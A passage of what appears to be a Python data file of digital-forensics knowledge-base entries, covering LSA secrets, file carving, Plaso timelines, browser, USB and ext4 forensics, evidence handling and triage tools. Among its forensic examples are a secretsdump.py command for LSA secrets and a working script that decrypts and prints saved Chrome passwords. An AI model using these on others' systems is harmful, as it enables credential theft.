# Proves execution: even if binary deleted, display name remains
```

## SECURITY Hive — LSA Secrets and Cached Credentials

```bash
# Requires SYSTEM hive for decryption
python secretsdump.py -security SECURITY -system SYSTEM LOCAL

# Output includes:
# DPAPI_SYSTEM — DPAPI master key protector
# $MACHINE.ACC — machine account password hash
# NL$KM — cached domain credential encryption key
# L$RTMTIMEBOMB_... — terminal server info
# _SC_<service> — service account passwords
# DefaultPassword — autologon password if configured
```
""",
    },
    {
        "title": "File Carving — Recovering Deleted Files, Magic Bytes, PhotoRec/Scalpel",
        "tags": ["file-carving", "deleted-files", "photoRec", "scalpel", "disk-forensics"],
        "content": """# File Carving — Recovering Deleted Files

## How File Deletion Works

When a file is deleted on NTFS:
1. MFT record marked as not in use (but data remains until overwritten)
2. `$Bitmap` marks clusters as free
3. `$UsnJrnl` records `FILE_DELETE` event
4. Actual data persists in unallocated clusters

File carving recovers files by identifying known headers (magic bytes) in raw disk data.

## Magic Bytes Reference

| File Type | Hex Signature (Header) | Hex Footer |
|---|---|---|
| JPEG | FF D8 FF E0 / FF D8 FF E1 | FF D9 |
| PNG | 89 50 4E 47 0D 0A 1A 0A | 49 45 4E 44 AE 42 60 82 |
| PDF | 25 50 44 46 (%PDF) | 25 25 45 4F 46 (%%EOF) |
| ZIP | 50 4B 03 04 | 50 4B 05 06 |
| PE/EXE | 4D 5A (MZ) | — |
| ELF | 7F 45 4C 46 | — |
| DOCX/XLSX | 50 4B 03 04 (ZIP-based) | — |
| DOC/XLS | D0 CF 11 E0 | — |
| 7-Zip | 37 7A BC AF 27 1C | — |
| RAR | 52 61 72 21 1A 07 | — |
| PCAP | D4 C3 B2 A1 (LE) / A1 B2 C3 D4 (BE) | — |
| SQLite | 53 51 4C 69 74 65 20 33 | — |

## PhotoRec

PhotoRec is a free, open-source file carver supporting 480+ file types.

```bash
# Interactive mode:
photorec /dev/sdb

# Command-line mode:
photorec /log /d output/ /cmd image.dd fileopt,everything,enable,exec

# Key options in interactive mode:
# 1. Select source (disk image or device)
# 2. Select partition type (Intel or EFI)
# 3. Select filesystem type (unknown = carve from raw)
# 4. Select output directory (never to the source disk!)

# Output: numbered directories containing recovered files
# File names are not recovered (only content and type)
```

## Scalpel

Scalpel is a fast, configurable file carver using header/footer definitions.

```bash
# Install:
apt install scalpel

# Configuration file: /etc/scalpel/scalpel.conf
# Uncomment types to carve, e.g.:
# jpg y 200000000 \xff\xd8\xff\xe0 \xff\xd9
# pdf y 10000000 %PDF
# zip y 10000000 PK\x03\x04 PK\x05\x06

# Run:
scalpel -c scalpel.conf -o output/ disk_image.dd

# Output:
# output/jpg-0-0/ : all recovered JPEG files
# output/pdf-0-0/ : all recovered PDF files
# output/audit.txt : detailed log
```

## Autopsy / Sleuth Kit File Carving

```bash
# The Sleuth Kit command-line:
# List all files including deleted:
fls -r -d image.dd    # -r recursive, -d deleted only

# Recover specific file by inode:
icat image.dd <inode_number> > recovered_file.exe

# Recover all deleted files:
fls -r -d image.dd | awk '{print $2}' | while read inode; do
  icat image.dd $inode > recovered/$inode.bin 2>/dev/null
done

# Autopsy GUI: Tools > File Analysis > show deleted files
```

## Custom Python Carver

```python
# Simple carver for PE executables in a disk image:
import struct

HEADER = b'\x4d\x5a'  # MZ magic

def carve_pe(image_path, output_dir):
    import os
    os.makedirs(output_dir, exist_ok=True)

    with open(image_path, 'rb') as f:
        data = f.read()

    offset = 0
    count = 0
    while True:
        offset = data.find(HEADER, offset)
        if offset == -1: break

        # Validate PE header
        try:
            e_lfanew = struct.unpack_from('<I', data, offset + 0x3C)[0]
            if e_lfanew < 0x40 or e_lfanew > 0x1000:
                offset += 2; continue
            pe_sig = data[offset + e_lfanew : offset + e_lfanew + 4]
            if pe_sig != b'PE\x00\x00':
                offset += 2; continue
        except:
            offset += 2; continue

        # Extract PE (estimate size or use SizeOfImage)
        try:
            size_offset = offset + e_lfanew + 4 + 20 + 56  # SizeOfImage field
            size = struct.unpack_from('<I', data, size_offset)[0]
            size = min(size, 50*1024*1024)  # Cap at 50MB
        except:
            size = 4096

        pe_data = data[offset:offset+size]
        out_path = f"{output_dir}/pe_{count:05d}_{offset:016x}.exe"
        with open(out_path, 'wb') as f:
            f.write(pe_data)
        print(f"Carved PE: {out_path} ({len(pe_data)} bytes)")
        count += 1
        offset += 2

    print(f"Total carved: {count} PE files")

carve_pe("disk_image.dd", "carved_pes/")
```

## Best Practices

```
1. NEVER carve to the same disk/image (overwrite risk)
2. Hash the image before and after to confirm integrity
3. For NTFS: first check MFT for deleted file records (faster, gives metadata)
4. File carving is last resort: no filenames, no timestamps, no directory structure
5. Filter carved files by size and hash against VirusTotal
6. For JPEG/PNG: open in hex viewer first (may contain malware embedded in images)
```
""",
    },
    {
        "title": "Timeline Analysis — Super Timelines with Plaso/log2timeline",
        "tags": ["timeline", "plaso", "log2timeline", "super-timeline", "disk-forensics", "dfir"],
        "content": """# Timeline Analysis with Plaso/log2timeline

## Concept

A super timeline aggregates timestamps from all artifact sources (filesystem, registry, event logs, browser history, prefetch, etc.) into a single chronological view. This reveals the complete attacker activity sequence.

## Installation

```bash
pip install plaso
# Or Docker (recommended for complex environments):
docker pull log2timeline/plaso
docker run -v /evidence:/evidence log2timeline/plaso log2timeline ...

# Verify installation:
log2timeline.py --version
psort.py --version
pinfo.py --version
```

## Creating a Plaso Storage File

```bash
# Process a disk image (Windows):
log2timeline.py --storage-file evidence.plaso --parsers win7 disk_image.dd

# Process a mounted filesystem directory:
log2timeline.py --storage-file evidence.plaso --parsers win7 /mnt/evidence/

# Process specific artifact types (faster, targeted):
log2timeline.py --storage-file evidence.plaso \
    --parsers "prefetch,mft,usnjrnl,winevtx,winreg,chrome_history,firefox_history" \
    /mnt/evidence/

# Process memory image:
log2timeline.py --storage-file mem_timeline.plaso \
    --parsers "volatility" memory.raw

# Parser groups:
# win7 — comprehensive Windows 7 parsers
# win7_slow — includes slow/expensive parsers
# linux — Linux/Unix parsers
# macos — macOS parsers

# Show available parsers:
log2timeline.py --parsers list
```

## Filtering with psort

```bash
# Full timeline to CSV:
psort.py -w timeline.csv -o l2tcsv evidence.plaso

# Filter by time range:
psort.py -w filtered.csv -o l2tcsv evidence.plaso \
    "date > '2025-03-15 14:00:00' AND date < '2025-03-15 16:00:00'"

# Filter by data type:
psort.py -w prefs.csv -o l2tcsv evidence.plaso "data_type contains 'prefetch'"
psort.py -w reg.csv -o l2tcsv evidence.plaso "data_type contains 'registry'"

# Search for IOCs:
psort.py -w ioc.csv -o l2tcsv evidence.plaso \
    "message contains 'malware.exe' OR message contains '185.220.101'"

# Output formats:
# l2tcsv — standard timeline format (best for Excel/Timeline Explorer)
# json_line — one JSON object per line
# timesketch — for Timesketch investigation platform
```

## Timesketch Integration

```bash
# Upload to Timesketch for collaborative investigation:
psort.py -o timesketch --server http://timesketch:5000 \
    --username admin --password admin --sketch_id 1 evidence.plaso

# Or use timesketch-import-client:
pip install timesketch-import-client
timesketch_importer --host http://timesketch:5000 \
    --username admin --password pass \
    --sketch_id 1 timeline.csv
```

## Timeline Explorer Analysis

Eric Zimmerman's Timeline Explorer provides an Excel-like GUI for filtering and analyzing super timelines.

```
1. Open timeline CSV in Timeline Explorer
2. Set filters on columns:
   - Date/Time: set IR window (e.g., ±2 hours around incident)
   - Source: filter to registry changes
   - Description: search for "malware.exe"
3. Color-code by source for visual pattern recognition
4. Export filtered view for report
```

## Manual Timeline Analysis

```bash
# grep-based search for attack timeline reconstruction:
grep -i "malware.exe\|svchost32\|evil.com" timeline.csv | sort -t, -k1 > attack_events.csv

# Find all registry changes in time window:
awk -F, '$1 >= "2025-03-15 14:00" && $1 <= "2025-03-15 16:00" && /registry/' timeline.csv

# Execution evidence across sources:
grep -E "prefetch|userassist|muicache|amcache" timeline.csv | \
  grep -i "malware.exe" | sort -t, -k1
```

## Key Timestamp Sources in Super Timeline

| Source | Plaso Parser | Forensic Value |
|---|---|---|
| $MFT | mft | File creation/modification/access |
| $UsnJrnl | usnjrnl | File operations (create/delete/rename) |
| Event logs (.evtx) | winevtx | Logon, process creation, service install |
| Registry | winreg | Configuration changes, persistence |
| Prefetch | prefetch | Program execution times |
| Browser history | chrome_history, firefox | Web activity |
| Email (.pst) | outlook_pst | Email timestamps |
| LNK files | lnk | File access via Explorer |
| Shellbags | shellbags | Folder navigation |
| SRUM | srum | Long-term execution/network history |
""",
    },
    {
        "title": "Browser Forensics — Chrome, Firefox, Edge History/Cache/Downloads",
        "tags": ["browser-forensics", "chrome", "firefox", "edge", "disk-forensics", "dfir"],
        "content": """# Browser Forensics

## Chrome/Chromium Artifact Locations

```
Profile directory: C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\

History           — SQLite: browsing history, downloads
Web Data          — SQLite: forms, autofill, credit cards (encrypted)
Login Data        — SQLite: saved passwords (encrypted with DPAPI)
Cookies           — SQLite: session cookies (encrypted)
Cache\            — Cached web content (binary format)
Network\Cookies   — Alternate cookie location (newer Chrome)
Bookmarks         — JSON: bookmarks
Extensions\       — Installed extensions
Local Storage\    — Per-site localStorage data
IndexedDB\        — Per-site IndexedDB
```

### Parsing Chrome Artifacts

```bash
# HistView / Hindsight / BrowsingHistoryView (GUI tools)

# Manual SQL queries:
sqlite3 "History" "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'), url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50;"

sqlite3 "History" "SELECT datetime(start_time/1000000-11644473600,'unixepoch'), target_path, total_bytes, danger_type FROM downloads ORDER BY start_time DESC LIMIT 20;"

# Chrome timestamps: microseconds since 1601-01-01
# Convert: (chrome_timestamp / 1000000) - 11644473600 = Unix timestamp

# Hindsight — comprehensive Chrome/Edge artifact parser:
pip install hindsight
hindsight.py -i "C:\Users\user\AppData\Local\Google\Chrome\User Data" -o chrome_report

# Output: Excel file with all artifact types in separate tabs
```

### Chrome Password Decryption

```python
# Chrome encrypts passwords with DPAPI (AES-256-GCM on modern Chrome)
# Requires: running as the user OR having the DPAPI master key

import sqlite3, subprocess, base64, json, os
from pathlib import Path

# Get encryption key (stored in Local State):
local_state = Path.home() / "AppData/Local/Google/Chrome/User Data/Local State"
state = json.loads(local_state.read_text())
encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]  # Remove DPAPI prefix

# Decrypt key with DPAPI:
import win32crypt
key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Decrypt each password:
from Crypto.Cipher import AES
db = sqlite3.connect("Login Data")
cursor = db.execute("SELECT origin_url, username_value, password_value FROM logins")
for url, user, pw_enc in cursor:
    iv = pw_enc[3:15]      # Bytes 3-14 = nonce (12 bytes)
    payload = pw_enc[15:]  # Remaining = ciphertext + 16-byte tag
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    password = cipher.decrypt(payload[:-16]).decode()
    print(f"{url} | {user} | {password}")
```

## Firefox Artifact Locations

```
Profile: C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\<random>.default\

places.sqlite     — History, bookmarks, downloads
cookies.sqlite    — Cookies
formhistory.sqlite — Form autofill
logins.json       — Saved passwords (encrypted)
key4.db           — Password encryption key (NSS)
cert9.db          — Certificates
extensions\       — Installed add-ons
cache2\           — Cached content
sessionstore.jsonlz4 — Session restore data (open tabs)
```

```bash
# Parse Firefox places.sqlite:
sqlite3 places.sqlite "SELECT datetime(last_visit_date/1000000,'unixepoch'), url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 50;"

# Firefox timestamps: microseconds since Unix epoch (different from Chrome!)

# Downloads:
sqlite3 places.sqlite "SELECT datetime(lastModified/1000000,'unixepoch'), content, fileSize FROM moz_annos WHERE anno_attribute_id IN (SELECT id FROM moz_anno_attributes WHERE name='downloads/destinationFileName');"

# Firefox Password Decryption (requires NSS library):
# firepwd.py (published tool):
python firepwd.py -d "C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\xxx.default"
```

## Microsoft Edge

```
Location: C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\
# Same SQLite format as Chrome (Edge is Chromium-based)
# Use same queries as Chrome
```

## Cache Analysis

```bash
# Chrome cache (binary format):
# ChromeCacheView (NirSoft) — GUI tool

# Extract cache entries with Python:
# cfv — Chrome File View tool

# Manual extraction:
# Cache files: \Cache\Cache_Data\f_XXXXXX
# Index file: \Cache\Cache_Data\index
# Parse with: cacheparser or ccl_chrome_indexeddb

# Look for: cached malware downloads, C2 responses, exfiltrated data
```

## Incognito / Private Browsing

Incognito mode does NOT write to disk history files. However:
```
- DNS cache still populated (ipconfig /displaydns)
- Memory contains browsing data (memory forensics)
- Network proxy/firewall logs capture traffic
- If system was imaged while browser was open: sessionstore contains session
```
""",
    },
    {
        "title": "USB Device Forensics — Windows USB Artifacts, SetupAPI, Registry",
        "tags": ["usb-forensics", "setupapi", "registry", "disk-forensics", "dfir"],
        "content": """# USB Device Forensics

## USB Artifact Sources

| Source | Location | Information |
|---|---|---|
| USBSTOR Registry | SYSTEM\Enum\USBSTOR | Device GUIDs, serial numbers, first connect |
| USB Registry | SYSTEM\Enum\USB | VID/PID, class, hardware IDs |
| MountedDevices | SYSTEM\MountedDevices | Drive letter assignments |
| MountPoints2 | NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2 | User-specific mount history |
| SetupAPI Log | C:\Windows\inf\setupapi.dev.log | First/last device install timestamps |
| Windows Event Logs | System.evtx | Event IDs 20001, 20003 (driver install) |
| Shell Notifications | NTUSER.DAT\Software\Microsoft\Windows\Shell\AttachmentExecute | Autorun history |

## Registry Analysis

```bash
# USBSTOR — storage devices ever connected:
RECmd.exe -f SYSTEM --kn "ControlSet001\Enum\USBSTOR" --csv output\
# Subkeys: VendorModel
# Sub-subkeys: Device serial number (or instance ID if no serial)
# Values: FriendlyName, DeviceDesc, ClassGUID, ParentIdPrefix

# USB — all USB devices (including non-storage):
RECmd.exe -f SYSTEM --kn "ControlSet001\Enum\USB" --csv output\
# VID_XXXX&PID_YYYY — vendor ID and product ID
# Lookup at https://devicehunt.com/

# MountedDevices — drive letter to device mapping:
RECmd.exe -f SYSTEM --kn "MountedDevices" --csv output\
# Binary data decoded: \DosDevices\E: = device GUID + serial

# User mount history (per user, per device):
RECmd.exe -f NTUSER.DAT --kn "Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2" --csv output\
# Subkey name = GUID of mounted device
# Shows which users mounted which devices
```

## SetupAPI Log Analysis

```bash
# C:\Windows\inf\setupapi.dev.log
# Contains: first install date/time for every device class

# Search for USB storage entries:
grep -A5 "USBSTOR" "C:\Windows\inf\setupapi.dev.log"

# Parse timestamps (local time):
# Format: >>>  [SetupCopyOEMInf] 2025-03-15 14:23:01.123
# First occurrence = first time device connected
# Log not cleared on reboot — persists since OS install
```

## Full USB Investigation Script

```python
# Extract USB history from offline SYSTEM and NTUSER.DAT hives
import subprocess, csv, json

def parse_usbstor(system_hive_path):
    """Extract USBSTOR device history."""
    result = subprocess.run([
        "RECmd.exe",
        "-f", system_hive_path,
        "--kn", "ControlSet001\\Enum\\USBSTOR",
        "--csv", "output\\",
        "--csvf", "usbstor.csv"
    ], capture_output=True)
    return "output\\usbstor.csv"

def analyze_usb_csv(csv_path):
    devices = {}
    with open(csv_path) as f:
        for row in csv.DictReader(f):
            key = row.get("KeyPath","")
            if "USBSTOR" in key:
                parts = key.split("\\")
                if len(parts) >= 7:
                    vendor_model = parts[5]
                    serial = parts[6]
                    devices[serial] = {
                        "model": vendor_model,
                        "first_seen": row.get("LastWriteTimestamp"),
                        "friendly_name": row.get("ValueData","") if row.get("ValueName") == "FriendlyName" else ""
                    }
    return devices
```

## Determining First/Last Connection Time

```
First connection:
1. SetupAPI.dev.log — absolute first time (persists, not cleared)
2. USBSTOR registry key LastWriteTime — may represent last device presence
3. MFT creation time of device registry key file (ntuser.dat.LOG entries)

Last connection:
1. USBSTOR registry LastWriteTime (updated on connect/disconnect on some versions)
2. Windows Event Log: EventID 2003 (Device removed)
3. NTUSER MountPoints2 key LastWriteTime

Drive letter assignment:
1. MountedDevices registry value
2. NTUSER MountPoints2 subkey

Files accessed from USB:
1. LNK files in Recent Items
2. Jump Lists pointing to USB drive path (e.g., E:\)
3. ShellBags for folder navigation on USB
```

## Practical Investigation Example

```bash
# Scenario: Investigate data exfiltration via USB

# Step 1: Identify USB devices connected in the timeframe
RECmd.exe -f SYSTEM --kn "ControlSet001\Enum\USBSTOR" --csv output\ --csvf usbstor.csv

# Step 2: Get device serial number and cross-reference to drive letter
RECmd.exe -f SYSTEM --kn "MountedDevices" --csv output\ --csvf mounted.csv

# Step 3: Find files accessed from that drive letter (e.g., E:\)
# LNK files pointing to E:\:
LECmd.exe -d "%APPDATA%\Microsoft\Windows\Recent\" --csv output\ | grep "E:\\"

# Jump Lists:
JLECmd.exe -d "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\" | grep "E:\\"

# Step 4: SetupAPI log for first connect timestamp
grep -B2 -A10 "<device_serial>" "C:\Windows\inf\setupapi.dev.log"

# Step 5: Shell notifications for autorun/content browse
RECmd.exe -f NTUSER.DAT --kn "Software\Microsoft\Windows\Shell" --csv output\
```
""",
    },
    {
        "title": "Linux Filesystem Forensics — ext4, Inodes, Journal Analysis",
        "tags": ["linux-forensics", "ext4", "inode", "journal", "disk-forensics", "dfir"],
        "content": """# Linux Filesystem Forensics — ext4

## ext4 Structure Overview

```
Disk → Partitions → ext4 Filesystem

ext4 Layout:
  Boot block (sector 0)
  Block Group 0:
    Superblock (block 0)
    Group Descriptor Table
    Block Bitmap
    Inode Bitmap
    Inode Table
    Data Blocks
  Block Group 1... (repeats)
```

## Inode Analysis

Every file/directory has an inode storing metadata (not the filename — that's in the directory entry).

```bash
# Get inode number of a file:
ls -i /bin/bash
# 917857 /bin/bash

# Show all inode fields:
stat /bin/bash
# File: /bin/bash
# Size: 1234567    Blocks: 2416    IO Block: 4096
# Inode: 917857    Links: 1
# Access: (0755/-rwxr-xr-x)  Uid: 0  Gid: 0
# Access: 2025-03-15 12:00:00 (atime)
# Modify: 2025-02-01 10:00:00 (mtime)
# Change: 2025-02-01 10:00:00 (ctime — inode change, NOT creation time)
# Birth:  2024-01-15 08:00:00 (btime — creation time, ext4 only)

# ext4 timestamps: atime (last access), mtime (last content modification),
#                  ctime (last metadata change), crtime/btime (creation)

# debugfs — raw filesystem inspection:
debugfs /dev/sda1
  stat <917857>           # Show inode by number
  ls /etc                 # List directory inodes
  dump <917857> /tmp/bash # Dump file by inode

# List all inodes in a directory:
debugfs /dev/sda1 -R "ls -l /"
```

## Deleted File Recovery

```bash
# List deleted inodes with The Sleuth Kit:
ils -f ext4 /dev/sda1              # List all inodes including deleted
fls -r -d /dev/sda1                # Files in MFT-equivalent tree, deleted only

# Recover file by inode:
icat /dev/sda1 <inode_number> > recovered_file

# Automated recovery with TSK:
tsk_recover -e /dev/sda1 output_dir/   # Recover all unallocated files

# Via debugfs:
debugfs /dev/sda1
  lsdel                    # List deleted inodes
  undel <inode_number>     # Attempt to undelete
  dump <inode_number> /tmp/recovered
```

## ext4 Journal Analysis

ext4 keeps a journal ($JOURNAL or .journal file) of metadata operations for crash recovery.

```bash
# Identify journal location:
debugfs /dev/sda1 -R "stat <8>"   # Inode 8 = journal file

# Dump journal:
debugfs /dev/sda1 -R "dump <8> journal.img"

# Parse journal with ext4magic:
apt install ext4magic
ext4magic /dev/sda1 -r -d recover_dir/    # Recover deleted files from journal
ext4magic /dev/sda1 -a "2025-03-15 12:00" -b "2025-03-15 16:00" -d recover_dir/
# Recover files with modifications in time window
```

## Key Forensic Artifacts on Linux

```bash
# Authentication logs:
/var/log/auth.log      # Ubuntu/Debian — SSH, sudo, PAM
/var/log/secure        # RHEL/CentOS
grep "Failed password\|Accepted password\|sudo" /var/log/auth.log

# Command history:
~/.bash_history         # Bash command history (may be cleared)
~/.zsh_history          # Zsh history
~/.python_history

# Persistence locations:
/etc/crontab
/etc/cron.d/
/var/spool/cron/crontabs/<user>
/etc/rc.local
/etc/init.d/
/etc/systemd/system/   # Systemd services
~/.config/systemd/user/ # User systemd services
/etc/ld.so.preload      # LD_PRELOAD rootkit

# Recently modified files (last 24 hours):
find / -mtime -1 -type f 2>/dev/null | grep -v /proc | grep -v /sys

# SUID/SGID files (privilege escalation vectors):
find / -perm -4000 -o -perm -2000 2>/dev/null | sort

# World-writable directories (attacker staging):
find / -type d -perm -777 2>/dev/null | grep -v /proc | grep -v /tmp
```

## The Sleuth Kit (TSK) Workflow

```bash
# Verify image integrity:
md5sum disk_image.dd

# Image information:
img_stat disk_image.dd

# Partition table:
mmls disk_image.dd
# Shows: partition offset in sectors

# Filesystem info (using sector offset):
fsstat -o <offset> disk_image.dd

# File listing (recursive, deleted included):
fls -r -o <offset> disk_image.dd

# Timeline creation:
mactime -b <(fls -r -m / -o <offset> disk_image.dd) > timeline.txt

# Combine with other sources for super timeline
```
""",
    },
]


IR_FORENSICS = [
    {
        "title": "Evidence Collection and Chain of Custody Best Practices",
        "tags": ["chain-of-custody", "evidence-collection", "dfir", "incident-response"],
        "content": """# Evidence Collection and Chain of Custody

## Legal Principles

- **Admissibility**: Evidence must be collected legally; unauthorized access voids it
- **Authenticity**: Must prove evidence hasn't been tampered (cryptographic hashing)
- **Completeness**: Collect all relevant evidence (not just what supports your hypothesis)
- **Reliability**: Document every step so results are reproducible

## Order of Volatility

Collect most volatile evidence first:

```
1. CPU registers, cache            (lost on reboot/shutdown)
2. Physical memory (RAM)           (lost on shutdown, may degrade on reboot)
3. Network connections, routing tables (may change rapidly)
4. Running processes               (lost on shutdown)
5. Open files and handles          (lost on shutdown)
6. System time and uptime          (for correlation)
7. Disk (logical then physical)    (persists but may be modified)
8. Remote logging (SIEM, proxy)    (persists, may be overwritten by rotation)
9. Physical configuration          (hardware info)
10. Archival media (backups)       (most persistent)
```

## Evidence Documentation Template

```
EVIDENCE ITEM FORM

Case Number:      IR-2025-0042
Evidence Item #:  001
Description:      Dell Latitude 5520 laptop, S/N XXXXXXXX
Location Found:   Analyst's desk, Building A Room 203
Time Found:       2025-03-15 14:15:00 UTC
Collected By:     Jane Smith (IR Lead)

Physical Description:
  Make/Model: Dell Latitude 5520
  S/N: XXXXXXXX
  Asset Tag: IT-12345
  Condition: Powered on, user logged in as DOMAIN\jsmith

Actions Taken:
  14:16 — Photographed system in place
  14:17 — Connected WinPmem USB drive
  14:18 — Executed: winpmem_mini_x64_rc2.exe memory.raw
  14:23 — Memory acquisition complete (16 GB)
  14:24 — Disk image started with FTK Imager
  15:45 — Disk image complete (512 GB)

Hashes:
  memory.raw:   SHA256 = abc123...
  disk.E01:     SHA256 = def456...
  MD5 (memory): 111222...
  MD5 (disk):   333444...

Chain of Custody:
  2025-03-15 15:45 — Transferred to locked evidence cabinet (Key #7)
  2025-03-16 09:00 — Retrieved by Bob Jones for analysis
  2025-03-16 17:00 — Returned to evidence cabinet
```

## Write Blocking

Always use hardware write blockers when imaging drives to prevent any modification.

```bash
# Hardware write blockers: Tableau T35689iu, WiebeTech UltraDock

# Software write blocking (Linux — less reliable, last resort):
blockdev --setro /dev/sdb     # Set block device read-only
# Verify:
blockdev --getro /dev/sdb     # Should return 1

# Mount read-only:
mount -o ro,noatime /dev/sdb1 /mnt/evidence
```

## Disk Imaging

```bash
# FTK Imager (Windows — GUI):
# File > Create Disk Image > Physical Drive
# Image type: E01 (EnCase) or RAW
# Hash: SHA256 + MD5

# dd (Linux — command line):
dd if=/dev/sdb of=disk.dd bs=4M conv=noerror,sync status=progress
# Hash verification:
md5sum disk.dd
sha256sum disk.dd

# dcfldd (enhanced dd):
dcfldd if=/dev/sdb of=disk.dd bs=4M hash=sha256 hashlog=disk_hash.txt

# ewfacquire (EnCase format):
ewfacquire /dev/sdb -t evidence_disk -c best -S 2G
# Creates: evidence_disk.E01, evidence_disk.E02, ...

# Verify image:
ewfverify evidence_disk.E01
```

## Network Evidence Preservation

```bash
# Capture current network state before isolation:
netstat -ano > netstat_before_isolation.txt     # Windows
ss -tulpn > ss_output.txt                       # Linux

# Firewall rule backup:
netsh advfirewall export firewall_rules.wfw     # Windows
iptables-save > iptables_backup.txt             # Linux

# ARP table:
arp -a > arp_table.txt

# Route table:
route print > route_table.txt                   # Windows
ip route show > ip_route.txt                    # Linux
```
""",
    },
    {
        "title": "Windows Triage Collection — KAPE, Velociraptor, CyLR",
        "tags": ["kape", "velociraptor", "cylr", "triage", "windows-forensics", "dfir"],
        "content": """# Windows Triage Collection

## KAPE (Kroll Artifact Parser and Extractor)

KAPE collects targeted artifact sets (Targets) and processes them through analysis modules (Modules).

```bash
# Basic collection (collect artifacts to C:\Triage):
kape.exe --tsource C: --tdest C:\Triage --target !BasicCollection

# Common targets:
# !BasicCollection — prefetch, event logs, registry, browser history
# KapeTriage       — comprehensive triage (recommended)
# WebServers       — IIS/Apache logs
# CloudAccounts    — cloud sync artifacts

# Collection + processing in one pass:
kape.exe --tsource C: --tdest C:\Triage --target KapeTriage \
    --mdest C:\Processed --module !EZParser

# Remote collection via UNC path (avoid writing to suspect disk):
kape.exe --tsource C: --tdest \\192.168.1.100\share\Triage --target KapeTriage

# List all available targets:
kape.exe --tlist

# List all available modules:
kape.exe --mlist
```

### KAPE Target Format

```yaml
# Example custom target: Malware Persistence
Description: Collect malware persistence artifacts
Author: SOC Team
Version: 1.0
Id: 12345678-1234-1234-1234-123456789012
RecreateDirectories: true
Targets:
  -
    Name: Run Keys
    Category: Registry
    Path: C:\Windows\System32\config
    FileMask: SOFTWARE
    Recursive: false
    IsDirectory: false
    SaveAsFileName: SOFTWARE
  -
    Name: Startup Folder
    Category: Persistence
    Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    FileMask: '*'
    Recursive: true
    IsDirectory: false
```

## Velociraptor

Velociraptor is an endpoint query and collection tool using VQL (Velociraptor Query Language).

```bash
# Install server (single binary):
velociraptor config generate -i > server.config.yaml
velociraptor --config server.config.yaml frontend -v

# Collect artifact from endpoint via GUI:
# Hunts > New Hunt > Add Artifacts > select artifacts
# Windows.KapeFiles.Targets
# Windows.System.Pslist
# Windows.Network.Netstat

# VQL queries in client:
velociraptor query "SELECT * FROM pslist()" --config client.config.yaml
velociraptor query "SELECT * FROM netstat()" --config client.config.yaml
```

### Key VQL Artifact Queries

```sql
-- List running processes with hashes:
SELECT Pid, Ppid, Name, CommandLine, Exe,
    hash(path=Exe).MD5 AS MD5,
    hash(path=Exe).SHA256 AS SHA256
FROM pslist()
WHERE Name =~ "(?i)(malware|suspicious)"

-- Find files modified in last hour:
SELECT FullPath, Mtime, Size
FROM glob(globs="C:\\**\\*.exe")
WHERE Mtime > now() - 3600

-- Check run keys:
SELECT Key.FullPath, Name, Data
FROM read_reg_key(globs="HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\**")

-- Check scheduled tasks:
SELECT Name, Command, Status
FROM scheduled_tasks()
WHERE Command =~ "(?i)(temp|appdata|programdata)"

-- Network connections with process info:
SELECT Pid, Name, Status, Laddr.IP, Laddr.Port, Raddr.IP, Raddr.Port
FROM netstat()
WHERE Status = "ESTABLISHED"
```

## CyLR

CyLR (Collect Your Live Response) is a lightweight triage collection tool.

```bash
# Collect to local directory:
CyLR.exe -o C:\Triage

# Collect to SFTP server (avoids writing to local disk):
CyLR.exe -u sftp_user -p sftp_pass -s 192.168.1.100 -port 22

# List what it collects:
CyLR.exe --listfiles

# Default collection includes:
# Event logs, registry hives, prefetch, browser artifacts, MFT, NTUSER.DAT
```

## Live System Commands (Manual Triage)

```powershell
# Quick manual triage script (run as administrator):
$output = "C:\Triage\$(hostname)_$(Get-Date -Format yyyyMMdd_HHmmss)"
New-Item -ItemType Directory -Path $output -Force

# System info
systeminfo > "$output\systeminfo.txt"
hostname > "$output\hostname.txt"
ipconfig /all > "$output\ipconfig.txt"

# Running processes
Get-Process | Select-Object PID, ProcessName, Path, CPU, StartTime |
  Export-Csv "$output\processes.csv"

# Network connections
netstat -ano > "$output\netstat.txt"

# Users and sessions
net user > "$output\users.txt"
query user > "$output\sessions.txt"
Get-LocalUser | Export-Csv "$output\local_users.csv"

# Persistence
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run |
  Export-Csv "$output\run_keys_hklm.csv"
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run |
  Export-Csv "$output\run_keys_hkcu.csv"
Get-ScheduledTask | Export-Csv "$output\scheduled_tasks.csv"
Get-Service | Export-Csv "$output\services.csv"

# Startup folder
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" |
  Export-Csv "$output\startup_programs.csv"

# Hash running executables
Get-Process | Where-Object {$_.Path} |
  ForEach-Object {
    [PSCustomObject]@{
      PID = $_.Id; Name = $_.ProcessName; Path = $_.Path
      SHA256 = (Get-FileHash $_.Path -Algorithm SHA256 2>$null).Hash
    }
  } | Export-Csv "$output\process_hashes.csv"
```
""",
    },
    {
        "title": "Ransomware Investigation Playbook — Scoping, Containment, Recovery",
        "tags": ["ransomware", "incident-response", "playbook", "containment", "dfir"],
        "content": """# Ransomware Investigation Playbook

## Initial Detection and Scoping (0-30 minutes)

```bash
# Immediate questions to answer:
# 1. Which systems are encrypted?
# 2. When did encryption begin?
# 3. Is encryption still ongoing?
# 4. What is the ransomware family?
# 5. How did the attacker gain initial access?

# Quick scoping queries (Elastic/SIEM):
# Find encrypted files (unusual extensions):
process.command_line:(*vssadmin* OR *bcdedit*) AND NOT user.name:SYSTEM

# Find mass file operations:
event.action:"FileCreated" AND
